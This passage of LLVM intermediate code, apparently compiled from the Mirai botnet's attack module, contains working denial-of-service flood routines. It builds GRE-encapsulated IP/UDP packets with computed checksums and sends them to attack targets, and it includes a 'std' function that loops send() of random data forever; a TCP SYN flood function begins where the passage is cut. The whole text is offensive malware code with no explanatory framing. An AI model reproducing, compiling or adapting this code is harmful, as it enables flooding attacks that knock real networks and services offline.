  %81 = getelementptr inbounds i8, i8* %48, i64 42
  %82 = bitcast i8* %81 to i16*
  store i16 %80, i16* %82, align 4
  %83 = getelementptr inbounds i8, i8* %48, i64 46
  store i8 %17, i8* %83, align 4
  %84 = getelementptr inbounds i8, i8* %48, i64 44
  %85 = bitcast i8* %84 to i16*
  store i16 %60, i16* %85, align 2
  %86 = getelementptr inbounds i8, i8* %48, i64 47
  store i8 17, i8* %86, align 1
  %. = select i1 %44, i32 1023, i32 %67
  %87 = getelementptr inbounds i8, i8* %48, i64 54
  %88 = bitcast i8* %87 to i32*
  store i32 %., i32* %88, align 4
  %89 = call zeroext i16 @htons(i16 zeroext %21) #11
  %90 = bitcast i8* %51 to i16*
  store i16 %89, i16* %90, align 2
  %91 = call zeroext i16 @htons(i16 zeroext %23) #11
  %92 = getelementptr inbounds i8, i8* %48, i64 60
  %93 = bitcast i8* %92 to i16*
  store i16 %91, i16* %93, align 2
  %94 = call zeroext i16 @htons(i16 zeroext %46) #11
  %95 = getelementptr inbounds i8, i8* %48, i64 62
  %96 = bitcast i8* %95 to i16*
  store i16 %94, i16* %96, align 2
  %indvars.iv.next140 = add nsw i64 %indvars.iv139, 1
  %97 = icmp slt i64 %indvars.iv.next140, %47
  br i1 %97, label %.lr.ph134.split.us, label %..preheader_crit_edge.loopexit149

; <label>:98:                                     ; preds = %33
  %99 = call i32 @close(i32 %31) #10
  br label %305

..preheader_crit_edge.loopexit:                   ; preds = %.lr.ph134.split
  br label %..preheader_crit_edge

..preheader_crit_edge.loopexit149:                ; preds = %.lr.ph134.split.us
  br label %..preheader_crit_edge

..preheader_crit_edge:                            ; preds = %..preheader_crit_edge.loopexit149, %..preheader_crit_edge.loopexit
  %.lcssa135.in = phi i64 [ %indvars.iv.next, %..preheader_crit_edge.loopexit ], [ %indvars.iv.next140, %..preheader_crit_edge.loopexit149 ]
  %.lcssa135 = trunc i64 %.lcssa135.in to i32
  store i32 %.lcssa135, i32* %5, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader132, %..preheader_crit_edge
  %100 = icmp eq i32 %30, -1
  %101 = and i32 %14, 65535
  %102 = icmp eq i32 %101, 65535
  %103 = and i32 %20, 65535
  %104 = icmp eq i32 %103, 65535
  %105 = and i32 %22, 65535
  %106 = icmp eq i32 %105, 65535
  %107 = icmp eq i8 %28, 0
  %108 = bitcast i32* %6 to i8*
  %109 = bitcast i32* %7 to i8*
  %110 = bitcast i32* %8 to i8*
  %111 = getelementptr inbounds i8, i8* %110, i64 2
  %112 = icmp eq i8 %26, 0
  %113 = add i32 %24, 8
  br label %.loopexit

.lr.ph134.split:                                  ; preds = %.lr.ph134.split.preheader, %.lr.ph134.split
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph134.split ], [ 0, %.lr.ph134.split.preheader ]
  %114 = call noalias i8* @calloc(i64 1510, i64 8) #10
  %115 = getelementptr inbounds i8*, i8** %11, i64 %indvars.iv
  store i8* %114, i8** %115, align 8
  %116 = getelementptr inbounds i8, i8* %114, i64 38
  %117 = getelementptr inbounds i8, i8* %114, i64 58
  store i8 69, i8* %114, align 4
  %118 = getelementptr inbounds i8, i8* %114, i64 1
  store i8 %13, i8* %118, align 1
  %119 = call zeroext i16 @htons(i16 zeroext %39) #11
  %120 = getelementptr inbounds i8, i8* %114, i64 2
  %121 = bitcast i8* %120 to i16*
  store i16 %119, i16* %121, align 2
  %122 = call zeroext i16 @htons(i16 zeroext %15) #11
  %123 = getelementptr inbounds i8, i8* %114, i64 4
  %124 = bitcast i8* %123 to i16*
  store i16 %122, i16* %124, align 4
  %125 = getelementptr inbounds i8, i8* %114, i64 8
  store i8 %17, i8* %125, align 4
  %126 = getelementptr inbounds i8, i8* %114, i64 9
  store i8 47, i8* %126, align 1
  %127 = getelementptr inbounds i8, i8* %114, i64 12
  %128 = bitcast i8* %127 to i32*
  store i32 %30, i32* %128, align 4
  %129 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %130 = load i32, i32* %129, align 4
  %131 = getelementptr inbounds i8, i8* %114, i64 16
  %132 = bitcast i8* %131 to i32*
  store i32 %130, i32* %132, align 4
  %133 = call zeroext i16 @htons(i16 zeroext 25944) #11
  %134 = getelementptr inbounds i8, i8* %114, i64 22
  %135 = bitcast i8* %134 to i16*
  store i16 %133, i16* %135, align 2
  %136 = call zeroext i16 @htons(i16 zeroext 2048) #11
  %137 = getelementptr inbounds i8, i8* %114, i64 36
  %138 = bitcast i8* %137 to i16*
  store i16 %136, i16* %138, align 1
  store i8 69, i8* %116, align 4
  %139 = getelementptr inbounds i8, i8* %114, i64 39
  store i8 %13, i8* %139, align 1
  %140 = call zeroext i16 @htons(i16 zeroext %42) #11
  %141 = getelementptr inbounds i8, i8* %114, i64 40
  %142 = bitcast i8* %141 to i16*
  store i16 %140, i16* %142, align 2
  %143 = call zeroext i16 @htons(i16 zeroext %43) #11
  %144 = getelementptr inbounds i8, i8* %114, i64 42
  %145 = bitcast i8* %144 to i16*
  store i16 %143, i16* %145, align 4
  %146 = getelementptr inbounds i8, i8* %114, i64 46
  store i8 %17, i8* %146, align 4
  %147 = getelementptr inbounds i8, i8* %114, i64 47
  store i8 17, i8* %147, align 1
  %.145 = select i1 %44, i32 1023, i32 %130
  %148 = getelementptr inbounds i8, i8* %114, i64 54
  %149 = bitcast i8* %148 to i32*
  store i32 %.145, i32* %149, align 4
  %150 = call zeroext i16 @htons(i16 zeroext %21) #11
  %151 = bitcast i8* %117 to i16*
  store i16 %150, i16* %151, align 2
  %152 = call zeroext i16 @htons(i16 zeroext %23) #11
  %153 = getelementptr inbounds i8, i8* %114, i64 60
  %154 = bitcast i8* %153 to i16*
  store i16 %152, i16* %154, align 2
  %155 = call zeroext i16 @htons(i16 zeroext %46) #11
  %156 = getelementptr inbounds i8, i8* %114, i64 62
  %157 = bitcast i8* %156 to i16*
  store i16 %155, i16* %157, align 2
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %158 = icmp slt i64 %indvars.iv.next, %47
  br i1 %158, label %.lr.ph134.split, label %..preheader_crit_edge.loopexit

.loopexit.loopexit:                               ; preds = %204
  br label %.loopexit.backedge

.loopexit.loopexit148:                            ; preds = %276
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %38, label %.loopexit.backedge, label %.lr.ph

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit, %.loopexit.loopexit148
  br label %.loopexit

.lr.ph:                                           ; preds = %.loopexit
  br i1 %100, label %.lr.ph.split.us.preheader, label %.lr.ph.split.preheader

.lr.ph.split.preheader:                           ; preds = %.lr.ph
  br label %.lr.ph.split

.lr.ph.split.us.preheader:                        ; preds = %.lr.ph
  br label %.lr.ph.split.us

.lr.ph.split.us:                                  ; preds = %.lr.ph.split.us.preheader, %204
  %storemerge131133.us = phi i32 [ %231, %204 ], [ 0, %.lr.ph.split.us.preheader ]
  %159 = sext i32 %storemerge131133.us to i64
  %160 = getelementptr inbounds i8*, i8** %11, i64 %159
  %161 = load i8*, i8** %160, align 8
  %162 = getelementptr inbounds i8, i8* %161, i64 24
  %163 = getelementptr inbounds i8, i8* %161, i64 38
  %164 = bitcast i8* %163 to %struct.iphdr*
  %165 = getelementptr inbounds i8, i8* %161, i64 58
  %166 = getelementptr inbounds i8, i8* %161, i64 66
  %167 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %159, i32 2
  %168 = load i8, i8* %167, align 4
  %169 = icmp ult i8 %168, 32
  br i1 %169, label %170, label %177

; <label>:170:                                    ; preds = %.lr.ph.split.us
  %171 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %159, i32 1
  %172 = load i32, i32* %171, align 4
  %173 = call i32 @ntohl(i32 %172) #11
  %174 = call i32 @htonl(i32 %173) #11
  %175 = getelementptr inbounds i8, i8* %161, i64 16
  %176 = bitcast i8* %175 to i32*
  store i32 %174, i32* %176, align 4
  br label %177

; <label>:177:                                    ; preds = %.lr.ph.split.us, %170
  %178 = getelementptr inbounds i8, i8* %161, i64 12
  %179 = bitcast i8* %178 to i32*
  store i32 0, i32* %179, align 4
  br i1 %102, label %180, label %185

; <label>:180:                                    ; preds = %177
  %181 = getelementptr inbounds i8, i8* %161, i64 4
  %182 = bitcast i8* %181 to i16*
  store i16 0, i16* %182, align 4
  %183 = getelementptr inbounds i8, i8* %161, i64 42
  %184 = bitcast i8* %183 to i16*
  store i16 999, i16* %184, align 4
  br label %185

; <label>:185:                                    ; preds = %180, %177
  br i1 %104, label %186, label %188

; <label>:186:                                    ; preds = %185
  %187 = bitcast i8* %165 to i16*
  store i16 0, i16* %187, align 2
  br label %188

; <label>:188:                                    ; preds = %186, %185
  br i1 %106, label %189, label %192

; <label>:189:                                    ; preds = %188
  %190 = getelementptr inbounds i8, i8* %161, i64 60
  %191 = bitcast i8* %190 to i16*
  store i16 0, i16* %191, align 2
  br label %192

; <label>:192:                                    ; preds = %189, %188
  br i1 %107, label %197, label %193

; <label>:193:                                    ; preds = %192
  %194 = getelementptr inbounds i8, i8* %161, i64 16
  %195 = bitcast i8* %194 to i32*
  %196 = load i32, i32* %195, align 4
  br label %197

; <label>:197:                                    ; preds = %193, %192
  %.sink3.us = phi i32 [ %196, %193 ], [ 0, %192 ]
  %198 = getelementptr inbounds i8, i8* %161, i64 54
  %199 = bitcast i8* %198 to i32*
  store i32 %.sink3.us, i32* %199, align 4
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %8, align 4
  call void @util_memcpy(i8* nonnull %162, i8* nonnull %108, i32 4) #10
  %200 = getelementptr inbounds i8, i8* %161, i64 30
  call void @util_memcpy(i8* %200, i8* nonnull %109, i32 4) #10
  %201 = getelementptr inbounds i8, i8* %161, i64 28
  call void @util_memcpy(i8* %201, i8* nonnull %110, i32 2) #10
  %202 = getelementptr inbounds i8, i8* %161, i64 34
  call void @util_memcpy(i8* %202, i8* %111, i32 2) #10
  br i1 %112, label %204, label %203

; <label>:203:                                    ; preds = %197
  call void @rand_str(i8* nonnull %166, i32 %24)
  br label %204

; <label>:204:                                    ; preds = %203, %197
  %205 = getelementptr inbounds i8, i8* %161, i64 10
  %206 = bitcast i8* %205 to i16*
  store i16 0, i16* %206, align 2
  %207 = bitcast i8* %161 to i16*
  %208 = call zeroext i16 @checksum_generic(i16* %207, i32 20)
  store i16 %208, i16* %206, align 2
  %209 = getelementptr inbounds i8, i8* %161, i64 48
  %210 = bitcast i8* %209 to i16*
  store i16 0, i16* %210, align 2
  %211 = bitcast i8* %163 to i16*
  %212 = call zeroext i16 @checksum_generic(i16* %211, i32 20)
  store i16 %212, i16* %210, align 2
  %213 = getelementptr inbounds i8, i8* %161, i64 64
  %214 = bitcast i8* %213 to i16*
  store i16 0, i16* %214, align 2
  %215 = getelementptr inbounds i8, i8* %161, i64 62
  %216 = bitcast i8* %215 to i16*
  %217 = load i16, i16* %216, align 2
  %218 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %164, i8* nonnull %165, i16 zeroext %217, i32 %113)
  store i16 %218, i16* %214, align 2
  %219 = load i32, i32* %5, align 4
  %220 = sext i32 %219 to i64
  %221 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %220, i32 0, i32 0
  store i16 2, i16* %221, align 4
  %222 = getelementptr inbounds i8, i8* %161, i64 16
  %223 = bitcast i8* %222 to i32*
  %224 = load i32, i32* %223, align 4
  %225 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %220, i32 0, i32 2, i32 0
  store i32 %224, i32* %225, align 4
  %226 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %220, i32 0, i32 1
  store i16 0, i16* %226, align 2
  %227 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %220, i32 0
  %228 = bitcast %struct.sockaddr_in* %227 to %struct.sockaddr*
  %229 = call i64 @sendto(i32 %31, i8* nonnull %161, i64 %.pre141, i32 16384, %struct.sockaddr* %228, i32 16) #10
  %230 = load i32, i32* %5, align 4
  %231 = add nsw i32 %230, 1
  store i32 %231, i32* %5, align 4
  %232 = icmp slt i32 %231, %37
  br i1 %232, label %.lr.ph.split.us, label %.loopexit.loopexit

.lr.ph.split:                                     ; preds = %.lr.ph.split.preheader, %276
  %storemerge131133 = phi i32 [ %303, %276 ], [ 0, %.lr.ph.split.preheader ]
  %233 = sext i32 %storemerge131133 to i64
  %234 = getelementptr inbounds i8*, i8** %11, i64 %233
  %235 = load i8*, i8** %234, align 8
  %236 = getelementptr inbounds i8, i8* %235, i64 24
  %237 = getelementptr inbounds i8, i8* %235, i64 38
  %238 = bitcast i8* %237 to %struct.iphdr*
  %239 = getelementptr inbounds i8, i8* %235, i64 58
  %240 = getelementptr inbounds i8, i8* %235, i64 66
  %241 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %233, i32 2
  %242 = load i8, i8* %241, align 4
  %243 = icmp ult i8 %242, 32
  br i1 %243, label %244, label %251

; <label>:244:                                    ; preds = %.lr.ph.split
  %245 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %233, i32 1
  %246 = load i32, i32* %245, align 4
  %247 = call i32 @ntohl(i32 %246) #11
  %248 = call i32 @htonl(i32 %247) #11
  %249 = getelementptr inbounds i8, i8* %235, i64 16
  %250 = bitcast i8* %249 to i32*
  store i32 %248, i32* %250, align 4
  br label %251

; <label>:251:                                    ; preds = %.lr.ph.split, %244
  br i1 %102, label %252, label %257

; <label>:252:                                    ; preds = %251
  %253 = getelementptr inbounds i8, i8* %235, i64 4
  %254 = bitcast i8* %253 to i16*
  store i16 0, i16* %254, align 4
  %255 = getelementptr inbounds i8, i8* %235, i64 42
  %256 = bitcast i8* %255 to i16*
  store i16 999, i16* %256, align 4
  br label %257

; <label>:257:                                    ; preds = %252, %251
  br i1 %104, label %258, label %260

; <label>:258:                                    ; preds = %257
  %259 = bitcast i8* %239 to i16*
  store i16 0, i16* %259, align 2
  br label %260

; <label>:260:                                    ; preds = %258, %257
  br i1 %106, label %261, label %264

; <label>:261:                                    ; preds = %260
  %262 = getelementptr inbounds i8, i8* %235, i64 60
  %263 = bitcast i8* %262 to i16*
  store i16 0, i16* %263, align 2
  br label %264

; <label>:264:                                    ; preds = %261, %260
  br i1 %107, label %269, label %265

; <label>:265:                                    ; preds = %264
  %266 = getelementptr inbounds i8, i8* %235, i64 16
  %267 = bitcast i8* %266 to i32*
  %268 = load i32, i32* %267, align 4
  br label %269

; <label>:269:                                    ; preds = %264, %265
  %.sink3 = phi i32 [ %268, %265 ], [ 0, %264 ]
  %270 = getelementptr inbounds i8, i8* %235, i64 54
  %271 = bitcast i8* %270 to i32*
  store i32 %.sink3, i32* %271, align 4
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %8, align 4
  call void @util_memcpy(i8* %236, i8* nonnull %108, i32 4) #10
  %272 = getelementptr inbounds i8, i8* %235, i64 30
  call void @util_memcpy(i8* %272, i8* nonnull %109, i32 4) #10
  %273 = getelementptr inbounds i8, i8* %235, i64 28
  call void @util_memcpy(i8* %273, i8* nonnull %110, i32 2) #10
  %274 = getelementptr inbounds i8, i8* %235, i64 34
  call void @util_memcpy(i8* %274, i8* %111, i32 2) #10
  br i1 %112, label %276, label %275

; <label>:275:                                    ; preds = %269
  call void @rand_str(i8* nonnull %240, i32 %24)
  br label %276

; <label>:276:                                    ; preds = %269, %275
  %277 = getelementptr inbounds i8, i8* %235, i64 10
  %278 = bitcast i8* %277 to i16*
  store i16 0, i16* %278, align 2
  %279 = bitcast i8* %235 to i16*
  %280 = call zeroext i16 @checksum_generic(i16* %279, i32 20)
  store i16 %280, i16* %278, align 2
  %281 = getelementptr inbounds i8, i8* %235, i64 48
  %282 = bitcast i8* %281 to i16*
  store i16 0, i16* %282, align 2
  %283 = bitcast i8* %237 to i16*
  %284 = call zeroext i16 @checksum_generic(i16* %283, i32 20)
  store i16 %284, i16* %282, align 2
  %285 = getelementptr inbounds i8, i8* %235, i64 64
  %286 = bitcast i8* %285 to i16*
  store i16 0, i16* %286, align 2
  %287 = getelementptr inbounds i8, i8* %235, i64 62
  %288 = bitcast i8* %287 to i16*
  %289 = load i16, i16* %288, align 2
  %290 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %238, i8* nonnull %239, i16 zeroext %289, i32 %113)
  store i16 %290, i16* %286, align 2
  %291 = load i32, i32* %5, align 4
  %292 = sext i32 %291 to i64
  %293 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %292, i32 0, i32 0
  store i16 2, i16* %293, align 4
  %294 = getelementptr inbounds i8, i8* %235, i64 16
  %295 = bitcast i8* %294 to i32*
  %296 = load i32, i32* %295, align 4
  %297 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %292, i32 0, i32 2, i32 0
  store i32 %296, i32* %297, align 4
  %298 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %292, i32 0, i32 1
  store i16 0, i16* %298, align 2
  %299 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %292, i32 0
  %300 = bitcast %struct.sockaddr_in* %299 to %struct.sockaddr*
  %301 = call i64 @sendto(i32 %31, i8* nonnull %235, i64 %.pre141, i32 16384, %struct.sockaddr* %300, i32 16) #10
  %302 = load i32, i32* %5, align 4
  %303 = add nsw i32 %302, 1
  store i32 %303, i32* %5, align 4
  %304 = icmp slt i32 %303, %37
  br i1 %304, label %.lr.ph.split, label %.loopexit.loopexit148

; <label>:305:                                    ; preds = %4, %98
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_std(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #10
  %8 = bitcast i8* %7 to i8**
  %9 = tail call noalias i8* @calloc(i64 %6, i64 4) #10
  %10 = bitcast i8* %9 to i32*
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 1024)
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = bitcast %struct.sockaddr_in* %5 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %17, i8 0, i64 16, i32 4, i1 false)
  %18 = and i32 %13, 65535
  %19 = icmp eq i32 %18, 65535
  br i1 %19, label %23, label %20

; <label>:20:                                     ; preds = %4
  %21 = trunc i32 %13 to i16
  %22 = tail call zeroext i16 @htons(i16 zeroext %21) #11
  br label %23

; <label>:23:                                     ; preds = %4, %20
  %.058 = phi i16 [ %22, %20 ], [ 0, %4 ]
  %24 = zext i8 %0 to i32
  %25 = icmp eq i8 %0, 0
  br i1 %25, label %.preheader.split.preheader, label %.lr.ph65

.preheader.split.preheader:                       ; preds = %.preheader, %23
  br label %.preheader.split

.lr.ph65:                                         ; preds = %23
  %26 = and i32 %11, 65535
  %27 = icmp eq i32 %26, 65535
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2, i32 0
  %31 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %32 = zext i8 %0 to i64
  br i1 %27, label %.lr.ph65.split.us.preheader, label %.lr.ph65.split.preheader

.lr.ph65.split.preheader:                         ; preds = %.lr.ph65
  br label %.lr.ph65.split

.lr.ph65.split.us.preheader:                      ; preds = %.lr.ph65
  br label %.lr.ph65.split.us

.lr.ph65.split.us:                                ; preds = %.lr.ph65.split.us.preheader, %51
  %indvars.iv = phi i64 [ %indvars.iv.next, %51 ], [ 0, %.lr.ph65.split.us.preheader ]
  %33 = call noalias i8* @calloc(i64 65535, i64 1) #10
  %34 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %33, i8** %34, align 8
  %35 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv
  %36 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 1
  store i16 0, i16* %36, align 2
  %37 = call i32 @socket(i32 2, i32 2, i32 0) #10
  %38 = getelementptr inbounds i32, i32* %10, i64 %indvars.iv
  store i32 %37, i32* %38, align 4
  %39 = icmp eq i32 %37, -1
  br i1 %39, label %.us-lcssa.us.loopexit, label %40

; <label>:40:                                     ; preds = %.lr.ph65.split.us
  store i16 2, i16* %28, align 4
  store i16 %.058, i16* %29, align 2
  store i32 0, i32* %30, align 4
  %41 = call i32 @bind(i32 %37, %struct.sockaddr* nonnull %31, i32 16) #10
  %42 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 2
  %43 = load i8, i8* %42, align 4
  %44 = icmp ult i8 %43, 32
  br i1 %44, label %45, label %51

; <label>:45:                                     ; preds = %40
  %46 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %47 = load i32, i32* %46, align 4
  %48 = call i32 @ntohl(i32 %47) #11
  %49 = call i32 @htonl(i32 %48) #11
  %50 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 2, i32 0
  store i32 %49, i32* %50, align 4
  br label %51

; <label>:51:                                     ; preds = %45, %40
  %52 = bitcast %struct.attack_target* %35 to %struct.sockaddr*
  %53 = call i32 @connect(i32 %37, %struct.sockaddr* %52, i32 16) #10
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %54 = icmp slt i64 %indvars.iv.next, %32
  br i1 %54, label %.lr.ph65.split.us, label %.preheader.loopexit

.preheader.loopexit:                              ; preds = %51
  br label %.preheader

.preheader.loopexit78:                            ; preds = %92
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit78, %.preheader.loopexit
  %55 = icmp eq i8 %16, 0
  %.mask = and i32 %14, 65535
  %56 = zext i32 %.mask to i64
  br i1 %25, label %.preheader.split.preheader, label %.preheader.split.us

.preheader.split.us:                              ; preds = %.preheader
  br i1 %55, label %.lr.ph.split.us.us.preheader, label %.lr.ph..lr.ph.split_crit_edge.us.preheader

.lr.ph..lr.ph.split_crit_edge.us.preheader.loopexit: ; preds = %.lr.ph.split.us.us
  br label %.lr.ph..lr.ph.split_crit_edge.us.preheader

.lr.ph..lr.ph.split_crit_edge.us.preheader:       ; preds = %.lr.ph..lr.ph.split_crit_edge.us.preheader.loopexit, %.preheader.split.us
  %.not = xor i1 %55, true
  br label %.lr.ph..lr.ph.split_crit_edge.us

.lr.ph..lr.ph.split_crit_edge.us:                 ; preds = %.lr.ph..lr.ph.split_crit_edge.us.preheader, %.lr.ph..lr.ph.split_crit_edge.us
  %.160.us61 = phi i32 [ %.mux67, %.lr.ph..lr.ph.split_crit_edge.us ], [ 0, %.lr.ph..lr.ph.split_crit_edge.us.preheader ]
  %57 = sext i32 %.160.us61 to i64
  %58 = getelementptr inbounds i8*, i8** %8, i64 %57
  %59 = load i8*, i8** %58, align 8
  call void @rand_str(i8* %59, i32 %.mask)
  %60 = getelementptr inbounds i32, i32* %10, i64 %57
  %61 = load i32, i32* %60, align 4
  %62 = call i64 @send(i32 %61, i8* %59, i64 %56, i32 16384) #10
  %63 = add nsw i32 %.160.us61, 1
  %64 = icmp slt i32 %63, %24
  %brmerge66 = or i1 %64, %.not
  %.mux67 = select i1 %64, i32 %63, i32 0
  br i1 %brmerge66, label %.lr.ph..lr.ph.split_crit_edge.us, label %.lr.ph.split.us.us.preheader.loopexit

.lr.ph.split.us.us.preheader.loopexit:            ; preds = %.lr.ph..lr.ph.split_crit_edge.us
  br label %.lr.ph.split.us.us.preheader

.lr.ph.split.us.us.preheader:                     ; preds = %.lr.ph.split.us.us.preheader.loopexit, %.preheader.split.us
  br label %.lr.ph.split.us.us

.lr.ph.split.us.us:                               ; preds = %.lr.ph.split.us.us.preheader, %.lr.ph.split.us.us
  %.160.us.us = phi i32 [ %.mux, %.lr.ph.split.us.us ], [ 0, %.lr.ph.split.us.us.preheader ]
  %65 = sext i32 %.160.us.us to i64
  %66 = getelementptr inbounds i8*, i8** %8, i64 %65
  %67 = load i8*, i8** %66, align 8
  %68 = getelementptr inbounds i32, i32* %10, i64 %65
  %69 = load i32, i32* %68, align 4
  %70 = call i64 @send(i32 %69, i8* %67, i64 %56, i32 16384) #10
  %71 = add nsw i32 %.160.us.us, 1
  %72 = icmp slt i32 %71, %24
  %brmerge = or i1 %72, %55
  %.mux = select i1 %72, i32 %71, i32 0
  br i1 %brmerge, label %.lr.ph.split.us.us, label %.lr.ph..lr.ph.split_crit_edge.us.preheader.loopexit

.lr.ph65.split:                                   ; preds = %.lr.ph65.split.preheader, %92
  %indvars.iv70 = phi i64 [ %indvars.iv.next71, %92 ], [ 0, %.lr.ph65.split.preheader ]
  %73 = call noalias i8* @calloc(i64 65535, i64 1) #10
  %74 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv70
  store i8* %73, i8** %74, align 8
  %75 = call zeroext i16 @htons(i16 zeroext %12) #11
  %76 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv70
  %77 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv70, i32 0, i32 1
  store i16 %75, i16* %77, align 2
  %78 = call i32 @socket(i32 2, i32 2, i32 0) #10
  %79 = getelementptr inbounds i32, i32* %10, i64 %indvars.iv70
  store i32 %78, i32* %79, align 4
  %80 = icmp eq i32 %78, -1
  br i1 %80, label %.us-lcssa.us.loopexit77, label %81

.us-lcssa.us.loopexit:                            ; preds = %.lr.ph65.split.us
  br label %.us-lcssa.us

.us-lcssa.us.loopexit77:                          ; preds = %.lr.ph65.split
  br label %.us-lcssa.us

.us-lcssa.us:                                     ; preds = %.us-lcssa.us.loopexit77, %.us-lcssa.us.loopexit
  ret void

; <label>:81:                                     ; preds = %.lr.ph65.split
  store i16 2, i16* %28, align 4
  store i16 %.058, i16* %29, align 2
  store i32 0, i32* %30, align 4
  %82 = call i32 @bind(i32 %78, %struct.sockaddr* nonnull %31, i32 16) #10
  %83 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv70, i32 2
  %84 = load i8, i8* %83, align 4
  %85 = icmp ult i8 %84, 32
  br i1 %85, label %86, label %92

; <label>:86:                                     ; preds = %81
  %87 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv70, i32 1
  %88 = load i32, i32* %87, align 4
  %89 = call i32 @ntohl(i32 %88) #11
  %90 = call i32 @htonl(i32 %89) #11
  %91 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv70, i32 0, i32 2, i32 0
  store i32 %90, i32* %91, align 4
  br label %92

; <label>:92:                                     ; preds = %86, %81
  %93 = bitcast %struct.attack_target* %76 to %struct.sockaddr*
  %94 = call i32 @connect(i32 %78, %struct.sockaddr* %93, i32 16) #10
  %indvars.iv.next71 = add nuw nsw i64 %indvars.iv70, 1
  %95 = icmp slt i64 %indvars.iv.next71, %32
  br i1 %95, label %.lr.ph65.split, label %.preheader.loopexit78

.preheader.split:                                 ; preds = %.preheader.split.preheader, %.preheader.split
  br label %.preheader.split
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #6

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) local_unnamed_addr #1

declare i32 @connect(i32, %struct.sockaddr*, i32) local_unnamed_addr #3

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpsyn(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #10
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 17, i32 65535)
